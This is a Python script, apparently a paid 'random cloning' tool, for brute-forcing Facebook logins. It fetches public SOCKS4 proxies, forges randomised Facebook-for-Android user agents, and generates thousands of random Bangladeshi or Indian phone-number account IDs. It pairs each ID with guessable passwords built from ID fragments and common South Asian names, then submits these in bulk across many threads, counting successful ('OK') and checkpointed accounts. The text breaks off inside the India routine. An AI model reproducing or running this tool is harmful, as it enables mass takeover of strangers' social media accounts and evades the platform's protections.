#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:
    print('Internet Error')
    sys.exit()

xvx = open('.prox.txt', 'r').read().splitlines()
#________________LOOP______________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#__________________LINE____________#
def linex():
    print(f'\033[1;97m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#
def ua():
 density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
 width = random.choice(["720", "1080", "1280"])
 height = random.choice(["720", "1080", "1280", "1440", "1920"])
 build = random.choice(['JE31XJ','O11019','LRS05S','N0PEO1','RQ1A.879590.026',',TP1A.566573.084','RP1A.769137.055','TQ2A.487681.018'])
 fbdv = random.choice(["Oppo 620T", ",CPH1909", "Oppo B719T", "Oppo R696J", "Oppo Z838","Oppo U117 Max","Oppo I985 Max","Oppo 197N"])
 END = f"[FBAN/Orca-Android;FBAV/"+str(random.randint(111,999))+".0.0."+str(random.randint(10,99))+"."+str(random.randint(111,999))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.randint(111111111,999999999))+";FBCR/Banglalink;FBMF/OPPO;FBBD/OPPO;FBDV/{fbdv};FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;] FBBK/1"
 ua = 'Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,15))+'.0.1; '+str(fbdv)+' Build/'+str(build)+') '+END
 return ua
def Samsung():
    sim = random.choice(["Telenor","Airtel","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","O2.CZ","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
    Anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    vrsn=random.choice(["4","5","6","7","8","9","10","11","12","5.0.1","6.0.1","7.0.1","8.0.1","9.0.1",".10.1","4.01.","3","13","14"])
    itgb=random.choice(["it_IT","en_GB","en_US","es_US","de_DE","pt_BR","th_TH","en_PH","es_MX","en_AU","ru_RU","en_AU","pt_PT","lt_LT","fr_FR","sv_SE","in_ID","ru_US","es_ES","pl_PL","cs_CZ","ar_EG","zh_TW_"])
    model=random.choice(["G891","Galaxy 3","Galaxy A Quantum","Galaxy A01","Galaxy A01 Core","Galaxy A02","Galaxy A02s","Galaxy A03","Galaxy A03 Core","Galaxy A03s","Galaxy A04","Galaxy A04e","Galaxy A04s","Galaxy A05","Galaxy A05s","Galaxy A10","Galaxy A10 Pro","Galaxy A10e","Galaxy A10s","Galaxy A11","Galaxy A12","Galaxy A13","Galaxy A13 5G","Galaxy A14","Galaxy A14 5G","Galaxy A2 Core","Galaxy A20","Galaxy A20e","Galaxy A20s","Galaxy A21","Galaxy A21s","Galaxy A22","Galaxy A22 5G","Galaxy A23","Galaxy A23 5G","Galaxy A24","Galaxy A3 (2015)","Galaxy A3 (2016)","Galaxy A3 (2017)","Galaxy A30","Galaxy A30s","Galaxy A31","Galaxy A32","Galaxy A32 5G","Galaxy A33 5G","Galaxy A34 5G","Galaxy A4","Galaxy A40","Galaxy A40s","Galaxy A41","Galaxy A42 5G","Galaxy A5","Galaxy A5 (2015)","Galaxy A5 (2016)","Galaxy A5 (2017)","Galaxy A5 Duos","Galaxy A50","Galaxy A50s","Galaxy A51","Galaxy A51 5G","Galaxy A52","Galaxy A52 5G","Galaxy A52s 5G","Galaxy A53 5G","Galaxy A53 5G UW","Galaxy A54","Galaxy A54 5G","Galaxy A6","Galaxy A6+","Galaxy A60","Galaxy A6s (2018)","Galaxy A7","Galaxy A7 (2016)","Galaxy A7 (2017)","Galaxy A7 (2018)","Galaxy A70","Galaxy A70s","Galaxy A71","Galaxy A71 5G","Galaxy A72","Galaxy A73 5G","Galaxy A8","Galaxy A8 (2016)","Galaxy A8 (2018)","Galaxy A8 Star","Galaxy A8+ (2018)","Galaxy A80","Galaxy A8s","Galaxy A9","Galaxy A9 (2018)","Galaxy A9 Pro","Galaxy A9 Star","Galaxy A90","Galaxy A90 5G","Galaxy Ace","Galaxy Ace 2","Galaxy ACE 3","Galaxy Ace 4Galaxy Ace 4 Duos","Galaxy Ace 4 Lite","Galaxy Ace 4 Neo","Galaxy Ace Duos S6802","Galaxy ACE Plus","Galaxy Ace S5830I","Galaxy Ace Style","Galaxy Active Neo","Galaxy Alpha","Galaxy Amp Prime 2","Galaxy Amp Prime 3 (2018)","Galaxy Apollo","Galaxy Avant","Galaxy Beam","Galaxy Beam 2","Galaxy Buddy","Galaxy Buddy 2","Galaxy C5","Galaxy C5 Pro","Galaxy C7","Galaxy C7 Pro","Galaxy C8","Galaxy C9 Pro","Galaxy Camera","Galaxy Camera 120","Galaxy Camera 2","Galaxy Camera WiFi only","Galaxy Centura","Galaxy Chat","Galaxy Core","Galaxy Core 2","Galaxy Core Advance","Galaxy CORE II","Galaxy Core Lite LTE","Galaxy Core LTE","Galaxy Core Max","Galaxy Core Mini 4G","Galaxy Core Plus","Galaxy Core Prime","Galaxy Core Prime Value Edition","Galaxy Discover","Galaxy E5","Galaxy E7","Galaxy Express","Galaxy Express I437","Galaxy EXPRESS II","Galaxy F02s","Galaxy F12","Galaxy F13","Galaxy F22","Galaxy F23 5G","Galaxy F41","Galaxy F42 5G","Galaxy F52 5G","Galaxy F62","Galaxy FAME","Galaxy FAME Duos","Galaxy FAME Lite with NFC","Galaxy Feel","Galaxy Feel 2","Galaxy Fit S5670","Galaxy Fold","Galaxy Fold 5G","Galaxy Folder","Galaxy Folder 2","Galaxy J1","Galaxy J1 (2016)","Galaxy J1 Ace","Galaxy J1 Mini","Galaxy J1 mini Prime","Galaxy J2","Galaxy J2 Core","Galaxy J2 Duos","Galaxy J2 Prime","Galaxy J2 Prime (TV)","Galaxy J2 Pro","Galaxy J2 Pure","Galaxy J250F","Galaxy J3","Galaxy J3 (2015)","Galaxy J3 (2016)","Galaxy J3 (2017)","Galaxy J3 (2018)","Galaxy J3 Achieve 2018","Galaxy J3 Aura","Galaxy J3 Eclipse","Galaxy J3 Emerge","Galaxy J3 Luna Pro","Galaxy J3 Mission","Galaxy J3 Orbit","Galaxy J3 Prime","Galaxy J3 Pro","Galaxy J3 Sky","Galaxy J3 Star","Galaxy J4","Galaxy J4 2018","Galaxy J4 Core","Galaxy J4+","Galaxy j5","Galaxy J5 (2015)","Galaxy J5 (2016)","Galaxy J5 (2017)","Galaxy J5 Prime","Galaxy J5 Pro (2017)","Galaxy J6","Galaxy J6+","Galaxy J7","Galaxy J7 (2015)","Galaxy J7 (2017)","Galaxy J7 (2018)","Galaxy J7 2016","Galaxy J7 Core","Galaxy J7 Crown","Galaxy J7 Duo","Galaxy J7 Max","Galaxy J7 Prime","Galaxy J7 Prime 2","Galaxy J7 Pro","Galaxy J7 Refine","Galaxy J7 Sky Pro","Galaxy j7 star 4512","Galaxy J7 V","Galaxy J7+ (C7)","Galaxy J8","Galaxy J8 Plus","Galaxy J8 Pro","Galaxy Jean","Galaxy Jean 2","Galaxy Jump 2","Galaxy Jump 5G","Galaxy K zoom","Galaxy Luna","Galaxy M01","Galaxy M01 Core","Galaxy M01s","Galaxy M02","Galaxy M02s","Galaxy M04","Galaxy M10","Galaxy M10s","Galaxy M11","Galaxy M12","Galaxy M13","Galaxy M13 5G","Galaxy M14 5G","Galaxy M20","Galaxy M21","Galaxy M21 2021","Galaxy M22","Galaxy M23 5G","Galaxy M30","Galaxy M30s","Galaxy M31","Galaxy M31s","Galaxy M32","Galaxy M32 5G","Galaxy M33 5G","Galaxy M34 5G","Galaxy M40","Galaxy M42 5G","Galaxy M51","Galaxy M52 5G","Galaxy M53 5G","Galaxy M54 5G","Galaxy M62","Galaxy Mega","Galaxy Mega 2","Galaxy Mini","Galaxy mini 2 S6500","Galaxy Mini S5570","Galaxy Music","Galaxy Note","Galaxy Note 10","Galaxy Note 10 Lite","Galaxy Note 10+","Galaxy Note 2","Galaxy Note 20","Galaxy Note 20 5G","Galaxy Note 20 Ultra","Galaxy Note 20 Ultra 5G","Galaxy Note 3","Galaxy Note 3 Duos","Galaxy Note 3 LTE","Galaxy Note 3 Neo","Galaxy Note 3 Neo Duo","Galaxy Note 4","Galaxy Note 4 Edge","Galaxy Note 4 LTE","Galaxy Note 5","Galaxy Note 5 Duos","Galaxy Note 7","Galaxy Note 8","Galaxy Note 9","Galaxy Note E160S","Galaxy Note Edge","Galaxy Note Fan Edition","Galaxy Note I717","Galaxy Note II","Galaxy Note II LTE","Galaxy Note II N7100","Galaxy Note III","Galaxy Note N7000","Galaxy Note N8000","Galaxy Note10","Galaxy Note20","Galaxy Note9","Galaxy NX","Galaxy On5","Galaxy On5 (2016)","Galaxy On7","Galaxy On7 (2016)","Galaxy On7 Prime","Galaxy On8","Galaxy Plus","Galaxy POCKET 2","Galaxy POCKET Neo","Galaxy POCKET Plus","Galaxy Pocket S5300","Galaxy Portal","Galaxy Pro","Galaxy Quantum 2","Galaxy Quantum 3","Galaxy Ring M840","Galaxy Round","Galaxy Rugby Pro I547","Galaxy S","Galaxy S Advance","Galaxy S DUOS","Galaxy S DUOS 2","Galaxy S DUOS 3","Galaxy S Giorgio Armani","Galaxy S II","Galaxy S II Epic 4G Touch","Galaxy S II HD LTE","Galaxy S II I777","Galaxy S II Plus","Galaxy S II WiMAX","Galaxy S III","Galaxy S III LTE","Galaxy S III mini","Galaxy S III mini Value Edition","Galaxy S III Neo","Galaxy S IV(I950X)","Galaxy S Plus","Galaxy S10","Galaxy S10 Lite","Galaxy S10+","Galaxy S10+ Olympic Games Edition","Galaxy S10e","Galaxy S10LITE","Galaxy S2","Galaxy S20","Galaxy S20 5G","Galaxy S20 FE","Galaxy S20 FE 5G","Galaxy S20 Ultra","Galaxy S20 Ultra 5G","Galaxy S20+","Galaxy S20+ 5G","Galaxy S2023","Galaxy S21","Galaxy S21 5G","Galaxy S21 5G Olympic Games Edition","Galaxy S21 5G UW","Galaxy S21 FE 5G","Galaxy S21 Ultra","Galaxy S21 Ultra 5G","Galaxy S21+","Galaxy S21+ 5G","Galaxy S22","Galaxy S22 Ultra","Galaxy S22+","Galaxy S23","Galaxy S23 FE","Galaxy S23 Ultra","Galaxy S23+","Galaxy S3","Galaxy S3 mini","Galaxy S4","Galaxy S4 ACTIVE","Galaxy S4 LTE","Galaxy S4 mini","Galaxy S4 Value Edition","Galaxy S4 with LTE+","Galaxy S4 zoom","Galaxy S5","Galaxy S5 Active","Galaxy S5 Duos","Galaxy S5 K Sport","Galaxy S5 LTE+","Galaxy S5 mini","Galaxy S5 Neo","Galaxy S6","Galaxy S6 Edge","Galaxy S6 Edge+","Galaxy S7","Galaxy S7 Active","Galaxy S7 Edge","Galaxy S8","Galaxy S8 Active","Galaxy S8 Lite","Galaxy S8+","Galaxy S9","Galaxy S9+","Galaxy SDM450","Galaxy Sii","Galaxy SIII","Galaxy SL","Galaxy Sol","Galaxy Sol 2","Galaxy Sol 3","Galaxy Spica","Galaxy STAR","Galaxy Star Pro","Galaxy Star S5280","Galaxy Stellar","Galaxy Trend","Galaxy Trend 2","Galaxy Trend Lite","Galaxy Trend Plus","Galaxy V Plus","Galaxy W","Galaxy W20","Galaxy W2016","Galaxy W2018","Galaxy W2019","Galaxy W21","Galaxy W22","Galaxy W23 Fold","Galaxy Watch 3 41mm","Galaxy Watch 3 41mm 4G","Galaxy Watch 3 45mm","Galaxy Watch 3 45mm LTE","Galaxy Watch 4 40mm","Galaxy Watch 4 44mm","Galaxy Watch 4 46mm","Galaxy Watch 42mm","Galaxy Watch 42mm LTE","Galaxy Watch 46mm","Galaxy Watch 46mm LTE","Galaxy Watch 5 40mm","Galaxy Watch 5 44mm","Galaxy Watch 5 Pro 45mm","Galaxy Watch 5 Pro 50mm","Galaxy Watch Active","Galaxy Watch Active 2 40mm","Galaxy Watch Active 2 40mm LTE","Galaxy Watch Active 2 44mm","Galaxy Watch Active 2 44mm LTE","Galaxy Wide","Galaxy Wide 5","Galaxy Win","Galaxy Win Pro","Galaxy Wonder","Galaxy Xcove 4S","Galaxy Xcover","Galaxy Xcover 2","Galaxy Xcover 3","Galaxy Xcover 3 VE","Galaxy Xcover 4","Galaxy Xcover 4s","Galaxy Xcover 5","Galaxy Xcover 6 Pro","Galaxy Xcover FieldPro","Galaxy Xcover Pro","Galaxy Y","Galaxy Y Duos","Galaxy Y Hello Kitty","Galaxy Y Pro","Galaxy Y Pro Duos","Galaxy Young","Galaxy Young 2","Galaxy Young 2 Pro","Galaxy Young DUOS","Galaxy Z Flip","Galaxy Z Flip 3","Galaxy Z Flip 4","Galaxy Z Flip 5","Galaxy Z Flip 5G","Galaxy Z Fold 2 5G","Galaxy Z Fold 3 5G","Galaxy Z Fold 4","Galaxy Z Fold 5","Galaxy Z Fold2","Galaxy Z1","Galaxy Z2","Galaxy Z3","Galaxy Z4","Gear Live","Gear S 40mm","Gear S2 42mm","GM1917","GoLsKK","Gt","GT-I9060I","GT-S6802","GX290","Galaxy Gear S2 43mm","Galaxy Gear S2 44mm","Galaxy Gear S3 Classic 41mm","Galaxy Gear S3 Frontier 33mm","Galaxy Gear S3 Frontier 46mm","Galaxy Gear Sport 43mm","Galaxy Gio","Galaxy Gio S5660","Galaxy Golden 2","Galaxy Grand","Galaxy Grand 2","Galaxy Grand Duos","Galaxy Grand Max","Galaxy Grand Neo","Galaxy Grand Neo Duos","Galaxy Grand Neo+","Galaxy Grand Prime","Galaxy Grand Prime Plus","Galaxy Grand Prime Plus 2018","Galaxy Grand Prime Pro","Galaxy Grand Prime VE Duos","Galaxy Halo","Galaxy J Max","B5702","BASIC","Browser","C3010","C5212","Chrome","Chromebook","Chromebook 3","Chromebook Plus","CMC221","DeskTop","Dream","DUOS","E1117","E1310","E2152","E250","F12","F41","Family Hub","Focus","Focus Flash","Focus S","Fossil","FS517","116","19A","2109119DG","21121119SG","4","5","830SC","a1","I5500 Galaxy 5","I8910","I927","iParalizer","J337R","J600G","J600GN","J810GF","K608","KT10","KT107","kt961","KT961PRO","M2004J19C","M2006C3LG","M2006C3MNG","M2012K11AG","M2102J20SG","m2note","M6","MEIZU","Mi","mobile","MUSTAFA","N70","N9106","N9106HD","N970F","note","nRCequ","Omnia 7","Omnia II","Omnia M","Omnia W","OW20W2","P9700","Q","Realise","S2","S3650 Corby","S500i","S5230 Star","S5E","S8","Samsung","SCG20","SGH-I527M","SGHX210","SM-G530T1","Smart","SMG991B","SPH-D710","SPHA900","SPHA920","SPHM320","T295","T805C","T805S","T835","T950S","Tab","TicWatch","Wave","Wave 3","Wave 525","Wave 533","Wave 578","Wave 72","Wave II","Wave M","Wave Y","Wide","X","Xcover","ZTE","GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","A10","A20","A205S","A21","A33","A4","A5","A50","A51","A52s","A56","A7","A70","A730F","A800F","A80Pro","A9S","Admire","ALF","AaQx4Rx","As88","Ativ SE","B5702","BASIC","Browser","C3010","C5212","Chrome","Chromebook","Chromebook 3","Chromebook Plus","CMC221","DeskTop","Dream","DUOS","E1117","E1310","E2152","E250","F12","F41","Family Hub","Focus","Focus Flash","Focus S","Fossil","FS517","G891","Galaxy 3","Galaxy A Quantum","Galaxy A01","Galaxy A01 Core","Galaxy A02","Galaxy A02s","Galaxy A03","Galaxy A03 Core","Galaxy A03s","Galaxy A04","Galaxy A04e","Galaxy A04s","Galaxy A05","Galaxy A05s","Galaxy A10","Galaxy A10 Pro","Galaxy A10e","Galaxy A10s","Galaxy A11","Galaxy A12","Galaxy A13","Galaxy A13 5G","Galaxy A14","Galaxy A14 5G","Galaxy A2 Core","Galaxy A20","Galaxy A20e","Galaxy A20s","Galaxy A21","Galaxy A21s","Galaxy A22","Galaxy A22 5G","Galaxy A23","Galaxy A23 5G","Galaxy A24","Galaxy A3 (2015)","Galaxy A3 (2016)","Galaxy A3 (2017)","Galaxy A30","Galaxy A30s","Galaxy A31","Galaxy A32","Galaxy A32 5G","Galaxy A33 5G","Galaxy A34 5G","Galaxy A4","Galaxy A40","Galaxy A40s","Galaxy A41","Galaxy A42 5G","Galaxy A5","Galaxy A5 (2015)","Galaxy A5 (2016)","Galaxy A5 (2017)","Galaxy A5 Duos","Galaxy A50","Galaxy A50s","Galaxy A51","Galaxy A51 5G","Galaxy A52","Galaxy A52 5G","Galaxy A52s 5G","Galaxy A53 5G","Galaxy A53 5G UW","Galaxy A54","Galaxy A54 5G","Galaxy A6","Galaxy A6+","Galaxy A60","Galaxy A6s (2018)","Galaxy A7","Galaxy A7 (2016)","Galaxy A7 (2017)","Galaxy A7 (2018)","Galaxy A70","Galaxy A70s","Galaxy A71","Galaxy A71 5G","Galaxy A72","Galaxy A73 5G","Galaxy A8","Galaxy A8 (2016)","Galaxy A8 (2018)","Galaxy A8 Star","Galaxy A8+ (2018)","Galaxy A80","Galaxy A8s","Galaxy A9","Galaxy A9 (2018)","Galaxy A9 Pro","Galaxy A9 Star","Galaxy A90","Galaxy A90 5G","Galaxy Ace","Galaxy Ace 2","Galaxy ACE 3","Galaxy Ace 4Galaxy Ace 4 Duos","Galaxy Ace 4 Lite","Galaxy Ace 4 Neo","Galaxy Ace Duos S6802","Galaxy ACE Plus","Galaxy Ace S5830I","Galaxy Ace Style","Galaxy Active Neo","Galaxy Alpha","Galaxy Amp Prime 2","Galaxy Amp Prime 3 (2018)","Galaxy Apollo","Galaxy Avant","Galaxy Beam","Galaxy Beam 2","Galaxy Buddy","Galaxy Buddy 2","Galaxy C5","Galaxy C5 Pro","Galaxy C7","Galaxy C7 Pro","Galaxy C8","Galaxy C9 Pro","Galaxy Camera","Galaxy Camera 120","Galaxy Camera 2","Galaxy Camera WiFi only","Galaxy Centura","Galaxy Chat","Galaxy Core","Galaxy Core 2","Galaxy Core Advance","Galaxy CORE II","Galaxy Core Lite LTE","Galaxy Core LTE","Galaxy Core Max","Galaxy Core Mini 4G","Galaxy Core Plus","Galaxy Core Prime","Galaxy Core Prime Value Edition","Galaxy Discover","Galaxy E5","Galaxy E7","Galaxy Express","Galaxy Express I437","Galaxy EXPRESS II","Galaxy F02s","Galaxy F12","Galaxy F13","Galaxy F22","Galaxy F23 5G","Galaxy F41","Galaxy F42 5G","Galaxy F52 5G","Galaxy F62","Galaxy FAME","Galaxy FAME Duos","Galaxy FAME Lite with NFC","Galaxy Feel","Galaxy Feel 2","Galaxy Fit S5670","Galaxy Fold","Galaxy Fold 5G","Galaxy Folder","Galaxy Folder 2","Galaxy Gear S2 43mm","Galaxy Gear S2 44mm","Galaxy Gear S3 Classic 41mm","Galaxy Gear S3 Frontier 33mm","Galaxy Gear S3 Frontier 46mm","Galaxy Gear Sport 43mm","Galaxy Gio","Galaxy Gio S5660","Galaxy Golden 2","Galaxy Grand","Galaxy Grand 2","Galaxy Grand Duos","Galaxy Grand Max","Galaxy Grand Neo","Galaxy Grand Neo Duos","Galaxy Grand Neo+","Galaxy Grand Prime","Galaxy Grand Prime Plus","Galaxy Grand Prime Plus 2018","Galaxy Grand Prime Pro","Galaxy Grand Prime VE Duos","Galaxy Halo","Galaxy J Max","Galaxy J1","Galaxy J1 (2016)","Galaxy J1 Ace","Galaxy J1 Mini","Galaxy J1 mini Prime","Galaxy J2","Galaxy J2 Core","Galaxy J2 Duos","Galaxy J2 Prime","Galaxy J2 Prime (TV)","Galaxy J2 Pro","Galaxy J2 Pure","Galaxy J250F","Galaxy J3","Galaxy J3 (2015)","Galaxy J3 (2016)","Galaxy J3 (2017)","Galaxy J3 (2018)","Galaxy J3 Achieve 2018","Galaxy J3 Aura","Galaxy J3 Eclipse","Galaxy J3 Emerge","Galaxy J3 Luna Pro","Galaxy J3 Mission","Galaxy J3 Orbit","Galaxy J3 Prime","Galaxy J3 Pro","Galaxy J3 Sky","Galaxy J3 Star","Galaxy J4","Galaxy J4 2018","Galaxy J4 Core","Galaxy J4+","Galaxy j5","Galaxy J5 (2015)","Galaxy J5 (2016)","Galaxy J5 (2017)","Galaxy J5 Prime","Galaxy J5 Pro (2017)","Galaxy J6","Galaxy J6+","Galaxy J7"])
    vir=str(random.choice(range(111111111,999999999)))
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    cho=str(random.choice(range(43,447)))
    cko=str(random.choice(range(11,999)))
    ua=f"Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/QP1A.190711.020) [FBAN/"+FBAN+";FBAV/"+cho+".0.0."+str(random.choice(range(11,99)))+"."+cko+";FBPN/"+platform+";FBLC/"+itgb+";FBBV/"+vir+";FBCR/"+sim+";FBMF/samsung;FBBD/samsung;FBDV/"+model+";FBSV/"+vrsn+";FBCA/arm64-v8a:null;FBDM/{density="+str(random.choice(range(1,9)))+",width="+str(random.choice(range(540,2380)))+",height="+str(random.choice(range(540,2790)))+"};FB_FW/1;] FBBK/1"
    return ua
#__________________LOGO____________#
sys.stdout.write('\x1b]2; ALONE [🥷] MURAD\x07')
S = '\033[1;97m'
I = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
M = '\033[1m'
Q = '\033[2m'
L = '\033[1;37m'
B = '\033[1;34m'
E = '\033[1;34m'
XX = '\x1b[1;31m'
G = '\x1b[1;32m'
logo=(f"""
 
 \x1b[1;92m███    ███ \x1b[1;96m██    ██ \x1b[1;95m██████  \x1b[1;94m █████  \x1b[1;93m██████  
 \x1b[1;92m████  ████ \x1b[1;96m██    ██ \x1b[1;95m██   ██ \x1b[1;94m██   ██ \x1b[1;93m██   ██ 
 \x1b[1;92m██ ████ ██ \x1b[1;96m██    ██ \x1b[1;95m██████  \x1b[1;94m███████ \x1b[1;93m██   ██ 
 \x1b[1;92m██  ██  ██ \x1b[1;96m██    ██ \x1b[1;95m██   ██ \x1b[1;94m██   ██ \x1b[1;93m██   ██ 
 \x1b[1;92m██      ██  \x1b[1;96m██████  \x1b[1;95m██   ██ \x1b[1;94m██   ██ \x1b[1;93m██████ 

 {L}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {L}[\x1b[1;32m+{L}]{R} AUTHOR   {L}◉{R} ALONE MURAD \x1b[1;37m[\x1b[1;92m69\x1b[1;37m]
 {L}[\x1b[1;32m+{L}]{R} FACEBOOK {L}◉{R} Alonemurad69
 {L}[\x1b[1;32m+{L}]{R} TOOL     {L}◉{R} RANDOM CLONING
 {L}[\x1b[1;32m+{L}]{R} TYPE     {L}◉{R} PAID\x1b[1;37m > \x1b[1;32mVERSION\x1b[1;37m >\x1b[1;32m 9.4
 {L}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'\033[1;97m [\033[1;92m1\033[1;97m]\033[1;92m RANDOM CLONING ')
    print(f' \033[1;97m[\033[1;92m2\033[1;97m]\033[1;92m CONTACT OWNER ')
    print(f' \033[1;97m[\033[1;92m0\033[1;97m] \033[1;92mEXIT TOOL ')
    linex()
    sex = input(f' \033[1;97m[\033[1;92m<>\033[1;97m]\033[1;92m CHOOSE \033[1;97m<>\033[1;92m ')
    if sex in ['1']:
        XXX()
    elif sex in ['2']:
        os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
    elif sex in ['0']:
        sys.exit()
        
    else:
        menu()
#__________________RANDOM DEF____________#
def XXX():
    clear()
    print(f'\033[1;97m [\033[1;92m1\033[1;97m]\033[1;92m BANGLADESH CLONE')
    print(f' \033[1;97m[\033[1;92m2\033[1;97m] \033[1;92mINDIA CLONE')
    print(f' \033[1;97m[\033[1;92m0\033[1;97m]\033[1;92m BACK MENU');linex()
    sex = input(f'\033[1;97m [\033[1;92m<>\033[1;97m]\033[1;92m CHOOSE \033[1;97m<>\033[1;92m ')
    if sex in ['1']:
        bd()
    elif sex in ['2']:
        ind()
    elif sex in ['0']:
    	menu()
    else:
        XXX()
#__________________BD DEF____________#
def bd():
    clear()
    print(f'\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m EXAMPLE \033[1;97m<>\033[1;92m 017 \033[1;97m<>\033[1;92m 019 \033[1;97m<>\033[1;92m 018 \033[1;97m<>\033[1;92m 016');linex()
    code = input(f' \033[1;97m[\033[1;92m<>\033[1;97m]\033[1;92m CHOOSE\033[1;97m  <>\033[1;92m ')
    clear()
    print(f' \033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m EXAMPLE \033[1;97m<>\033[1;92m 3000\033[1;97m <> \033[1;92m5000\033[1;97m <> \033[1;92m10000\033[1;97m <> \033[1;92m99999');linex()
    limit = int(input(f' \033[1;97m[\033[1;92m<>\033[1;97m] \033[1;92mCHOOSE  \033[1;97m<>\033[1;92m '))
    linex()
    print(" \033[1;97m[\033[1;92m1\033[1;97m]\033[1;92m METHOD 1\n\033[1;97m [\033[1;92m2\033[1;97m] \033[1;92mMETHOD 2 ");linex()
    option=input("\033[1;97m [\033[1;92m<>\033[1;97m]\033[1;92m CHOOSE\033[1;97m <>\033[1;92m ")
    linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=60) as murad:
        clear()
        print(f'\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m SIM CODE \033[1;97m <> \033[1;92m{code}')
        print(f'\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m TOTAL UID \033[1;97m<>\033[1;92m {str(len(user))}')
        print(f"\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m TURN \033[1;97m[\033[1;92mON\033[1;97m/\033[1;92mOFF\033[1;97m]\033[1;92m AIRPLANE MODE FOR BEST RESULTS");linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            xb = love[2:]
            psd = [ids,love,ax,bx,cx,xa,xb,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','arafat','taniya','muradmurad','nomannoman','fahimfahim','sahinsahin','safinsafin','shamima','riaria','kawser','nazrul','mohammad','asadul','tasnim']
            if option=='1':
            	murad.submit(randm,ids,psd)
            if option=='2':
            	murad.submit(randm1,ids,psd)
    print('')
    print(f'\r\033[1;97m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f' \033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m THE PROCESS HAS BEEN COMPLETED')
    print(f' \033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m TOTAL OK ID\033[1;97m <> \033[1;92m{str(len(ok))}')
    print(f' \033[1;97m[\033[1;92m+\033[1;97m] \033[1;92mTOTAL CP ID \033[1;97m<>\033[1;92m {str(len(cp))}')
    print(f'\r \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f' \033[1;97m[\033[1;92m+\033[1;97m] \033[1;92mPRESS ENTER TO BACK ')
    menu()
#__________________INDIA DEF____________#
def ind():
    clear()
    print(f'\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m EXAMPLE\033[1;97m <>\033[1;92m 91639\033[1;97m <> \033[1;92m91934 \033[1;97m<>\033[1;92m 91902\033[1;97m <> \033[1;92m91701');linex()
    code = input(f' \033[1;97m[\033[1;92m<>\033[1;97m] \033[1;92mCHOOSE\033[1;97m  <>\033[1;92m ')
    clear()
    print(f' \033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m EXAMPLE\033[1;97m <> \033[1;92m3000\033[1;97m <> \033[1;92m5000 \033[1;97m<>\033[1;92m 10000 \033[1;92m<> \033[1;92m99999');linex()
    limit = int(input(f' \033[1;97m[\033[1;92m<>\033[1;97m]\033[1;92m CHOOSE\033[1;97m  <>\033[1;92m '))
    linex()
    print(" \033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m METHOD 1\n\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m METHOD 2")
    linex()
    option=input("\033[1;97m [\033[1;92m<>\033[1;97m] \033[1;92mCHOOSE \033[1;97m<>\033[1;92m ")
    linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as murad:
        clear()
        print(f'\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m SIM CODE \033[1;97m <> \033[1;92m{code}')
